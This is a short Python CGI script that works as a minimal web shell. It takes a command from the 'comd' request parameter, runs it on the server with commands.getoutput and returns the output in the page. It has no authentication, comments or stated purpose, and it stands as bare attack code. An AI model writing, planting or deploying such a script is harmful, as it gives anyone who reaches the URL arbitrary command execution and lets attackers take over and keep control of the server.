#!/usr/bin/python

import cgi,commands

print "Content-type:text/html\r\n\r\n"

data = cgi.FieldStorage()
command = data.getvalue("comd")
print commands.getoutput(command)

